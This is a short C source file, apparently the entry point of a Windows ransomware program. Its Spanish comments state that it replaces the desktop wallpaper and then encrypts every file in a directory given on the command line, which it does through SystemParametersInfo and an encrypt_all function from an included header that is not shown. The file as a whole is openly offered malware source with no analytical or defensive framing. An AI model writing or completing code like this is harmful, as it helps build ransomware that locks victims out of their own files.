#include "lib/encrypt.h"

#pragma comment( lib, "user32.lib" )

int main(int argc, char *argv[]) {

	if (argc != 2) {
		printf("%s [directorio]", argv[0]);
		exit(0);
	}

	char *directory = argv[1];

	/*
	* Cambia el fondo de pantalla y luego cifra
	* todos los archivo del directorio
	*/
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "C:\\imagen.png", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	encrypt_all(directory, argv[0]);

	

	
}